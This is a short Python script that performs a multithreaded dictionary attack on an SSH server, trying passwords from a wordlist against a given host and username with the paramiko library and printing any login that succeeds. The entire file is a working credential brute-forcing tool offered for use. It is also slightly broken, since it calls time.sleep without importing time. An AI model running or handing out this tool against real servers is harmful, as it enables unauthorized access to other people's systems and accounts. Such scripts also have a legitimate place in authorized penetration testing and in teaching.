#!/usr/bin/env python3
''' Performs a dictionary attack on a SSH server by using the paramiko
library.
'''
import paramiko
import argparse
import threading
import sys
sys.path.append('../')
import mypack.fileops as fileops

found = False
max_conn = 5
conn_lock = threading.BoundedSemaphore(value=max_conn)

def ssh_connect(ipaddr, port, username, passwd):
    global found
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=ipaddr, port=port, username=username,
                       password=passwd, banner_timeout=5)
    except paramiko.ssh_exception.AuthenticationException:
        pass
    except paramiko.ssh_exception.SSHException:
        time.sleep(3)
    else:
        print('Found username/password {}/{}'.format(username,passwd))
        found = True
    finally:
        client.close()
        conn_lock.release()

def main():
    parser = argparse.ArgumentParser(description='''Performs a Dictionary
                                     attack on a SSH server.''')
    parser.add_argument('-t', '--host', help='Host to attack', required=True)
    parser.add_argument('-p', '--port', help='''Port on which SSH server is
                        listening Default is 22''', default=22, required=False)
    parser.add_argument('-u', '--user', help='Username to test against',
                        required=True)
    parser.add_argument('-d', '--dict', help='''Dictionary file to test
                        passwords from''', required=True)
    args = parser.parse_args()
    ipaddr = args.host
    port = args.port
    username = args.user
    fname_dict = args.dict

    passwords = fileops.FileReader(fname_dict)

    for passwd in passwords:
        conn_lock.acquire()
        print('Trying username/password: {}/{}'.format(username, passwd))
        t = threading.Thread(target=ssh_connect, args=(ipaddr, port, username, passwd))
        t.start()
        if found:
            break

if __name__ == '__main__':
    main()
